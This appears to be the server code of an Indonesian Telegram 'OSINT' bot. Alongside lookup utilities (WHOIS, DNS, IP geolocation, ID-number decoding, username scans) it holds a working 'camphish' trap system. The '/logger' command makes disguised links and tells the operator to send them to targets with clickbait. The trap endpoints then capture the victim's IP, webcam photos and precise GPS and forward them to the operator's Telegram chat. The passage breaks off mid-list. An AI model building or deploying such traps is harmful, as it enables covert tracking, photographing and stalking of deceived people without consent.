import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dns from "dns";
import util from "util";
import { Telegraf, Markup } from "telegraf";
import net from "net";
import crypto from "crypto";
import fs from "fs";
import { templates } from "./trapTemplates";

const resolveMx = util.promisify(dns.resolveMx);

// Timeout helper for fetch
const fetchWithTimeout = async (url: string, options: RequestInit = {}, timeoutMs: number = 4000) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
};

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Stateless Trap ID Generation & Validation
  const generateTrapId = (chatId: number) => {
    return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
  };

  const getChatIdFromTrapId = (trapId: string): number | null => {
    try {
      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
      if (decoded.includes('-OSINT-')) {
        const idStr = decoded.split('-OSINT-')[0];
        return parseInt(idStr, 10);
      }
      return null;
    } catch {
      return null;
    }
  };

  // Default to the current AI Studio Dev URL. It will automatically update to Shared URL when someone visits it.
  let appHost = process.env.VITE_APP_URL || "https://ais-dev-wgiyctmskpzuuihqjrqsoy-125749415297.asia-southeast1.run.app";

  app.use(express.json());

  app.use((req, res, next) => {
    // Attempt to capture public URL from host or x-forwarded-host
    const hostObj = req.headers['x-forwarded-host'] || req.headers.host;
    if (hostObj) {
      const hostStr = Array.isArray(hostObj) ? hostObj[0] : hostObj;
      if (hostStr.includes('.run.app')) {
        appHost = `https://${hostStr}`;
      }
    }
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // Proxy for WHOIS & DNS via hacker target (or other public APIs)
  app.get("/api/osint/whois", async (req, res) => {
    try {
      const q = req.query.q;
      if (!q) return res.status(400).json({ error: "Missing query" });
      const response = await fetch(`https://api.hackertarget.com/whois/?q=${q}`);
      const data = await response.text();
      res.json({ data });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/osint/dns", async (req, res) => {
    try {
      const q = req.query.q;
      if (!q) return res.status(400).json({ error: "Missing query" });
      const response = await fetch(`https://api.hackertarget.com/dnslookup/?q=${q}`);
      const data = await response.text();
      res.json({ data });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/osint/ip", async (req, res) => {
    try {
      const ip = req.query.ip;
      let url = "http://ip-api.com/json/";
      if (ip) {
        url += ip;
      }
      const response = await fetch(url);
      const data = await response.json();
      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/osint/email", async (req, res) => {
    try {
      const email = req.query.email as string;
      if (!email || !email.includes("@")) {
        return res.status(400).json({ error: "Invalid email FORMAT" });
      }
      const domain = email.split("@")[1];
      const records = await resolveMx(domain);
      res.json({ validFormat: true, domain, mxRecords: records });
    } catch (err: any) {
      res.json({ validFormat: true, domain: req.query.email?.toString().split("@")[1], error: err.message, message: "Could not find MX records, domain might be invalid or not accepting emails." });
    }
  });

  // Username search on a few platforms (simulate status check)
  app.post("/api/osint/username", async (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: "Missing username" });

    // This is a naive check. A real OSINT tool like Sherlock uses hundreds of sites with custom headers.
    const platforms = [
      { name: "GitHub", url: `https://github.com/${username}` },
      { name: "Twitter / X", url: `https://twitter.com/${username}` },
      { name: "Instagram", url: `https://www.instagram.com/${username}/` },
      { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
      { name: "YouTube", url: `https://www.youtube.com/@${username}` }
    ];

    const results = await Promise.all(platforms.map(async (platform) => {
      try {
        const response = await fetch(platform.url, { 
          method: "HEAD",
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          }
        });
        // 200 usually means found, 404 means not found. 
        // Note: Twitter, IG, TikTok heavily block automated HEAD requests and may return 200 (login page) or 302.
        // For a true implementation, specialized APIs are needed. We return the HTTP status as an indicator.
        return { name: platform.name, url: platform.url, status: response.status, found: response.status === 200 };
      } catch (err) {
        return { name: platform.name, url: platform.url, status: "error", found: false };
      }
    }));

    res.json({ username, results });
  });

  // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
  app.get('/t/:tmplId/:id', (req, res) => {
    const { id, tmplId } = req.params;
    const chatId = getChatIdFromTrapId(id);
    if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2><p>This logger link has expired or the bot system was restarted. Please generate a new link using /logger.</p>');

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (process.env.TELEGRAM_BOT_TOKEN) {
      const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      
      let msg = `🌟 <b>TARGET HIT DETECTED!</b> 🌟\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `📅 <b>Waktu:</b> <code>${timestamp} WIB</code>\n` +
                `🌐 <b>IP Address:</b> <code>${ip}</code>\n` +
                `📁 <b>Template:</b> <code>${templates[tmplId] ? templates[tmplId].name : 'Default'}</code>\n` +
                `🖥️ <b>User-Agent:</b>\n<code>${userAgent}</code>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `💡 <i>Menunggu data Camera/GPS... Pastikan target menekan <b>"Allow"</b> pada browser mereka.</i>`;

      bot.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
    }

    const template = templates[tmplId] || templates['1'];
    res.send(template.render(id));
  });

  // Backward compatibility alias for default template
  app.get('/t/:id', (req, res) => {
    req.params.tmplId = '1';
    app._router.handle(req, res, () => {});
  });

  // Handle Camphish Image Upload
  app.post('/api/log/:id/cam', express.json({limit: '10mb'}), (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
      const { image } = req.body;
      if (image && typeof image === 'string') {
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
        const imageBuffer = Buffer.from(base64Data, 'base64');
        const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
        
        const caption = `📸 <b>CAPTURE SUCCESS! (CAMPHISH)</b> 📸\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <b>Status:</b> Kamera Berhasil Diakses\n` +
                        `🎭 <b>Wajah Target Terdeteksi!</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `<i>Data ini diambil secara real-time saat target berada di halaman trap.</i>`;

        bot.telegram.sendPhoto(chatId, { source: imageBuffer }, { 
          caption, 
          parse_mode: 'HTML' 
        }).catch(console.error);
      }
    }
    res.sendStatus(200);
  });

  app.post('/api/log/:id/gps', express.json(), (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
      const { lat, lon, acc } = req.body;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      
      const msg = `📍 <b>PRECISION LOCATION FOUND!</b> 🚨\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🛰️ <b>Latitude:</b> <code>${lat}</code>\n` +
                  `🛰️ <b>Longitude:</b> <code>${lon}</code>\n` +
                  `🎯 <b>Accuracy:</b> <code>${acc} meter</code>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🗺️ <a href="${mapLink}">KLIK DISINI UNTUK BUKA GOOGLE MAPS</a>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `⚙️ <i>Info: Ini adalah koordinat GPS asli dari hardware perangkat target.</i>`;

      bot.telegram.sendMessage(chatId, msg, { 
        parse_mode: 'HTML', 
        disable_web_page_preview: false 
      }).catch(console.error);
    }
    res.sendStatus(200);
  });
  // ==============================================

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use((req, res, next) => {
      // Don't intercept /t or /api
      if (req.path.startsWith('/t/') || req.path.startsWith('/api')) {
        return next();
      }
      vite.middlewares(req, res, next);
    });
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res, next) => {
      // Avoid sending index.html for api or /t routes by letting them fall through
      if (req.path.startsWith('/api') || req.path.startsWith('/t/')) {
        return next();
      }
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // TELEGRAM BOT SETUP
  if (process.env.TELEGRAM_BOT_TOKEN) {
    const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

    const startMsgText = `🌟 <b>Selamat Datang di Bot OSINT & Tools Dashboard</b> 🕵️‍♂️\n\nSilakan pilih kategori menu di bawah ini untuk melihat daftar fitur (tersedia 30+ fitur):`;
    
    const mainKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🔍 OSINT Indonesia', 'menu_osint_basic'), Markup.button.callback('📡 Advanced OSINT', 'menu_osint_adv')],
      [Markup.button.callback('🛠️ Advanced Tools', 'menu_tools'), Markup.button.callback('🎲 Fun & Random', 'menu_fun')]
    ]);

    bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));

    bot.action('menu_main', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      ctx.editMessageText(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }).catch(() => {});
    });

    bot.action('menu_osint_basic', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `🇮🇩 <b>OSINT INDONESIA & BASIC OSINT</b>\n\n` +
        `Gunakan perintah-perintah berikut:\n` +
        `• <code>/nik [nomor]</code> - Dekode NIK KTP\n` +
        `• <code>/plat [nomor]</code> - Analisis Plat\n` +
        `• <code>/ip [target]</code> - Geolocation IP\n` +
        `• <code>/email [email]</code> - Validasi MX records\n` +
        `• <code>/username [user]</code> - Scan jejaring sosial\n` +
        `• <code>/whois [domain]</code> - Cek data Whois Domain\n` +
        `• <code>/dns [domain]</code> - Cek DNS Records`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_osint_adv', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `📡 <b>ADVANCED OSINT TOOLS</b>\n\n` +
        `• <code>/logger</code> - <b>(NEW)</b> Buat Link Logger IP & GPS Location Tracker\n` +
        `• <code>/mac [mac_address]</code> - Cek MAC Vendor\n` +
        `• <code>/headers [url]</code> - Ambil HTTP Headers\n` +
        `• <code>/dork [keyword]</code> - Generator Google Dorks\n` +
        `• <code>/bininfo [bin]</code> - Cek info kartu kredit (BIN)\n` +
        `• <code>/subdomain [domain]</code> - Cari daftar subdomain\n` +
        `• <code>/github_user [user]</code> - Info detail akun GitHub\n` +
        `• <code>/port [ip] [port]</code> - Scan Port terbuka\n` +
        `• <code>/phone_dork [nomor]</code> - Dork pelacakan nomor HP\n` +
        `• <code>/domain</code> - Panduan advanced dns/whois`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tools', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `🛠️ <b>ADVANCED TOOLS (Non-OSINT)</b>\n\n` +
        `• <code>/qr [teks]</code> - Generate QR Code\n` +
        `• <code>/shortlink [url]</code> - Persingkat URL (is.gd)\n` +
        `• <code>/pwd [panjang]</code> - Buat password kuat\n` +
        `• <code>/b64enc [teks]</code> - Encode ke Base64\n` +
        `• <code>/b64dec [teks]</code> - Decode dari Base64\n` +
        `• <code>/md5 [teks]</code> - Buat hash MD5\n` +
        `• <code>/sha256 [teks]</code> - Buat hash SHA256\n` +
        `• <code>/uuid</code> - Generate random UUID v4\n` +
        `• <code>/morse [teks]</code> - Convert teks ke Sandi Morse\n` +
        `• <code>/math [ekspresi]</code> - Kalkulator (contoh: 2+2*5)\n` +
        `• <code>/weather [kota]</code> - Info cuaca terkini\n` +
        `• <code>/crypto_price [koin]</code> - Cek harga Crypto (USD/IDR)`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_fun', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `🎲 <b>FUN & RANDOM</b>\n\n` +
        `• <code>/flip</code> - Lempar koin (Heads / Tails)\n` +
        `• <code>/roll</code> - Lempar dadu (1-6)\n` +
        `• <code>/meme</code> - Dapatkan meme random\n` +
        `• <code>/joke</code> - Random joke (Bahasa Inggris)\n` +
        `• <code>/quote</code> - Quotes random\n` +
        `• <code>/fact</code> - Fakta unik dan random\n` +
        `• <code>/cat</code> - Random gambar kucing 🐱\n` +
        `• <code>/dog</code> - Random gambar anjing 🐶`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('nik', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /nik 3201010101900001");
      const nik = args[1];

      if (!/^\d{16}$/.test(nik)) {
        return ctx.reply("❌ NIK harus terdiri dari 16 digit angka.");
      }

      const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };

      const prov = nik.substring(0, 2);
      const kab = nik.substring(2, 4);
      const kec = nik.substring(4, 6);
      let tgl = parseInt(nik.substring(6, 8), 10);
      const bln = nik.substring(8, 10);
      let thn = parseInt(nik.substring(10, 12), 10);
      const urut = nik.substring(12, 16);

      let jk = "Laki-laki 👨";
      if (tgl >= 40) {
        jk = "Perempuan 👩";
        tgl -= 40;
      }
      
      const currentYear = new Date().getFullYear() % 100;
      thn = thn > currentYear ? 1900 + thn : 2000 + thn;

      const provinsi = provMap[prov] || "Tidak diketahui";

      ctx.reply(`🔍 <b>Analisis NIK KTP</b>\n\n📌 NIK: <code>${nik}</code>\n\n🗺️ <b>Wilayah</b>\nProvinsi: ${provinsi} (Kode: ${prov})\nKode Kota/Kab: ${kab}\nKode Kec: ${kec}\n\n👤 <b>Data Diri</b>\nJenis Kelamin: ${jk}\nTanggal Lahir: ${tgl.toString().padStart(2, '0')}-${bln}-${thn}\nNomor Urut Pendaftaran: ${urut}`, { parse_mode: 'HTML' });
    });

    bot.command('plat', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /plat B 1234 ABC atau /plat B1234ABC");
      
      const platInput = args.slice(1).join('').toUpperCase();
      const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
      
      if (!match) return ctx.reply("❌ Format plat nomor tidak valid.");
      
      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang, Salatiga, Kendal, Demak", "K": "Pati, Kudus, Jepara, Rembang, Blora, Grobogan", "R": "Banyumas, Cilacap, Purbalingga, Banjarnegara", "AA": "Magelang, Purworejo, Kebumen, Temanggung, Wonosobo", "AD": "Surakarta, Sukoharjo, Boyolali, Klaten, Karanganyar, Wonogiri, Sragen", "AB": "DI Yogyakarta", "L": "Surabaya", "M": "Madura", "N": "Malang, Probolinggo, Pasuruan, Lumajang", "P": "Besi, Situbondo, Bondowoso, Jember, Banyuwangi", "S": "Bojonegoro, Mojokerto, Tuban, Lamongan, Jombang", "W": "Sidoarjo, Gresik", "AE": "Madiun, Ngawi, Magetan, Ponorogo, Pacitan", "AG": "Kediri, Blitar, Tulungagung, Nganjuk, Trenggalek", "DK": "Bali", "DR": "Lombok", "EA": "Sumbawa", "DH": "Timor", "EB": "Flores", "ED": "Sumba", "KB": "Kalimantan Barat", "DA": "Kalimantan Selatan", "KH": "Kalimantan Tengah", "KT": "Kalimantan Timur", "KU": "Kalimantan Utara", "DB": "Manado, Tomohon, Bitung", "DL": "Sangihe, Talaud, Sitaro", "DM": "Gorontalo", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };

      const kodeWilayah = match[1];
      const angka = match[2];
      const kodeDetail = match[3];

      const wilayah = platMap[kodeWilayah] || "Wilayah tidak terdaftar";

      ctx.reply(`🚗 <b>Analisis Plat Kendaraan</b>\n\n🧾 Nomor: <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n\n📌 <b>Kode Area (${kodeWilayah})</b>\nWilayah: ${wilayah}\n\n🔢 Nomor Polisi: ${angka}\n🔡 Kode Detail/Sub-wilayah: ${kodeDetail || '-'}`, { parse_mode: 'HTML' });
    });

    bot.command('sethost', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length > 1) {
        let newHost = args[1];
        if (!newHost.startsWith('http')) newHost = 'https://' + newHost;
        appHost = newHost;
        ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
      } else {
        ctx.reply(`ℹ️ <b>Host saat ini:</b>\n<code>${appHost}</code>\n\nJika link IP Logger error (problem loading page/localhost/404), gunakan perintah:\n<code>/sethost https://URL_WEB_ANDA</code>\nAtau pastikan web app Anda sedang online.`, {parse_mode: 'HTML'});
      }
    });

    bot.command('logger', (ctx) => {
      const id = generateTrapId(ctx.chat.id);
      
      let replyMessage = `🎣 <b>LINK LOGGER BERHASIL DIBUAT!</b>\n\n<b>Silakan copy link dengan template yang Anda inginkan:</b>\n\n`;
      
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        replyMessage += `<b>${key}. ${tmpl.name}</b>\n<code>${trapUrl}</code>\n\n`;
      });
      
      replyMessage += `<b>Cara Penggunaan:</b>\n1. Copy salah satu link di atas dan kirimkan ke target dengan dalih/clickbait.\n2. Saat target membuka link, Anda mendapat IP Target.\n3. Jika target mengizinkan "Allow" Camera/Lokasi, Anda akan mendapat <b>FOTO TARGET</b> dan <b>LOKASI PRESISI MAX</b>.\n\n<i>Note: Sangat disarankan set host ke Vercel/Railway pakai <code>/sethost</code> jika deploy ini di cloud.</i>`;
      
      ctx.reply(replyMessage, {parse_mode: 'HTML', disable_web_page_preview: true});
    });

    bot.command('ip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const ip = args.length > 1 ? args[1] : '';
      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting,query`;
      
      try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === 'success') {
          const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
          let reply = `🔍 <b>INFO TARGET IP:</b> <code>${data.query}</code>\n\n`;
          reply += `🏢 <b>Provider & Organisasi:</b>\n`;
          reply += `ISP: ${data.isp || '-'}\nOrg: ${data.org || '-'}\nASN: ${data.as || '-'}\nHostname: ${data.reverse || '-'}\n\n`;
          reply += `📍 <b>Lokasi (Registrasi Jaringan):</b>\n`;
          reply += `Negara: ${data.country || '-'}\nProvinsi: ${data.regionName || '-'}\nKota: ${data.city || '-'}\nKecamatan: ${data.district || '-'}\nKode Pos: ${data.zip || '-'}\nTimezone: ${data.timezone || '-'}\n`;
          reply += `Koordinat: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n<a href="${mapLink}">🗺️ Buka di Google Maps (Area Provider)</a>\n\n`;
          reply += `🛡️ <b>Deteksi Keamanan:</b>\n`;
          reply += `Mobile/Seluler: ${data.mobile ? '✅ Ya' : '❌ Tidak'}\n`;
          reply += `Proxy/VPN/Tor: ${data.proxy ? '⚠️ YA (Disembunyikan)' : '❌ Tidak'}\n`;
          reply += `Hosting/Datacenter: ${data.hosting ? '⚠️ YA (Server)' : '❌ Tidak'}\n\n`;
          reply += `<i>Catatan: Tracking IP Umum hanya menunjuk menara BTS / Server Provider terdekat, BUKAN rumah target. Untuk tracking target asli, gunakan fitur: <b>/logger</b></i>`;
          ctx.reply(reply, { parse_mode: 'HTML', disable_web_page_preview: true });
        } else {
          ctx.reply("❌ Gagal mendapatkan informasi IP.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek IP.");
      }
    });

    bot.command('whois', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /whois google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`🔍 Sedang menganalisis detail registrar WHOIS untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await res.json();
        if (data.status === 'OK' && data.whois) {
          let txt = `🌐 <b>WHOIS DATA: <code>${domain}</code></b>\n\n`;
          txt += `<b>📝 Registrar:</b> ${data.whois.registrar || '-'}\n`;
          txt += `<b>📅 Dibuat:</b> ${data.whois.creation_date || '-'}\n`;
          txt += `<b>🔄 Diperbarui:</b> ${data.whois.updated_date || '-'}\n`;
          txt += `<b>⏳ Berakhir:</b> ${data.whois.expiration_date || '-'}\n\n`;
          txt += `<b>📡 Name Servers:</b>\n${(data.whois.name_servers || []).map((ns:any)=>`• <code>${ns}</code>`).join('\n')}\n`;
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply(`❌ Whois data tidak ditemukan untuk <code>${domain}</code>. (Pastikan format domain benar tanpa https://)`, {parse_mode: 'HTML'});
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek Whois.");
      }
    });

    bot.command('dns', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /dns google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
        const data = await response.json();
        if(data.status === 'OK' && data.records) {
          let txt = `📋 <b>DNS RECORDS: <code>${domain}</code></b>\n\n`;
          ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS'].forEach(type => {
            if(data.records[type] && data.records[type].length > 0) {
              txt += `<b>[+] ${type} Records:</b>\n`;
              data.records[type].forEach((rec: any) => {
                if(type === 'MX') txt += `• <code>${rec.exchange}</code> (Prioritas: ${rec.priority})\n`;
                else if(type === 'TXT') txt += `• <code>${rec.replace(/.{1,40}/g, '$&\n  ')}</code>\n`;
                else txt += `• <code>${rec.address || rec}</code>\n`;
              });
              txt += '\n';
            }
          });
          if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong karena limit Telegram)";
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply("❌ DNS records tidak ditemukan.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek DNS.");
      }
    });

    bot.command('domain', (ctx) => ctx.reply("Gunakan /whois [domain] atau /dns [domain]"));

    bot.command('email', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || !args[1].includes('@')) return ctx.reply("Format salah. Contoh: /email target@example.com");
      const email = args[1];
      
      try {
        const domain = email.split("@")[1];
        const records = await resolveMx(domain);
        if (records && records.length > 0) {
          ctx.reply(`✅ Email [${email}] memiliki format valid.\n🏢 Domain [${domain}] AKTIF menerima email.\n\nMemiliki MX records:\n${records.map(r => `- [Pri: ${r.priority}] ${r.exchange}`).join('\n')}`);
        } else {
          ctx.reply(`❌ Tidak ditemukan MX records untuk domain ${domain}.`);
        }
      } catch (e) {
        ctx.reply(`❌ Format valid, tapi kami tidak bisa memverifikasi MX records (domain mungkin tidak aktif atau memblokir pengecekan).`);
      }
    });

    bot.command('username', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("❌ <b>Format salah.</b>\nContoh: <code>/username targetnya</code>", { parse_mode: 'HTML' });
      
      const rawInput = args.slice(1).join('').toLowerCase();
      const username = rawInput.replace(/[^a-z0-9_.-]/g, '');
      if (!username) return ctx.reply("❌ <b>Username tidak valid.</b>", { parse_mode: 'HTML' });
      
      ctx.reply(`🔍 Memindai jejak digital untuk <b>@${username}</b>...\n<i>Mengecek puluhan platform...</i>`, { parse_mode: 'HTML' });
      
      const platforms = [
        // Global Social Media & Tech (~80 Platforms)
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Tumblr", url: `https://${username}.tumblr.com` },
        { name: "Medium", url: `https://medium.com/@${username}` },
        { name: "Vimeo", url: `https://vimeo.com/${username}` },
        { name: "SoundCloud", url: `https://soundcloud.com/${username}` },
        { name: "Spotify", url: `https://open.spotify.com/user/${username}` },
        { name: "Twitch", url: `https://www.twitch.tv/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "Flickr", url: `https://www.flickr.com/people/${username}` },
        { name: "Patreon", url: `https://www.patreon.com/${username}` },
        { name: "Dev.to", url: `https://dev.to/${username}` },
        { name: "Wattpad", url: `https://www.wattpad.com/user/${username}` },
        { name: "VK", url: `https://vk.com/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "Linktree", url: `https://linktr.ee/${username}` },
        { name: "Dribbble", url: `https://dribbble.com/${username}` },
        { name: "Behance", url: `https://www.behance.net/${username}` },
        { name: "About.me", url: `https://about.me/${username}` },
        { name: "Fiverr", url: `https://www.fiverr.com/${username}` },
        { name: "Gumroad", url: `https://gumroad.com/${username}` },
        { name: "Quora", url: `https://www.quora.com/profile/${username}` },
        { name: "Telegram", url: `https://t.me/${username}` },
        { name: "CodePen", url: `https://codepen.io/${username}` },
        { name: "HackerRank", url: `https://www.hackerrank.com/${username}` },
        { name: "LeetCode", url: `https://leetcode.com/${username}` },
        { name: "Kaggle", url: `https://www.kaggle.com/${username}` },
        { name: "Pastebin", url: `https://pastebin.com/u/${username}` },
        { name: "ProductHunt", url: `https://www.producthunt.com/@${username}` },
        { name: "Slack", url: `https://${username}.slack.com` },
        { name: "Trello", url: `https://trello.com/${username}` },
        { name: "Bandcamp", url: `https://bandcamp.com/${username}` },
        { name: "Last.fm", url: `https://www.last.fm/user/${username}` },
        { name: "ReverbNation", url: `https://www.reverbnation.com/${username}` },
        { name: "Letterboxd", url: `https://letterboxd.com/${username}` },
        { name: "MyAnimeList", url: `https://myanimelist.net/profile/${username}` },
        { name: "Goodreads", url: `https://www.goodreads.com/${username}` },
        { name: "Strava", url: `https://www.strava.com/athletes/${username}` },
        { name: "TripAdvisor", url: `https://www.tripadvisor.com/members/${username}` },
        { name: "Roblox", url: `https://www.roblox.com/user.aspx?username=${username}` },
        { name: "Minecraft", url: `https://namemc.com/profile/${username}` },
        { name: "Chess.com", url: `https://www.chess.com/member/${username}` },
        { name: "Lichess", url: `https://lichess.org/@/${username}` },
        { name: "eBay", url: `https://www.ebay.com/usr/${username}` },
        { name: "HubPages", url: `https://hubpages.com/@${username}` },
        { name: "Instructables", url: `https://www.instructables.com/member/${username}` },
        { name: "DailyMotion", url: `https://www.dailymotion.com/${username}` },
        { name: "Giphy", url: `https://giphy.com/channel/${username}` },
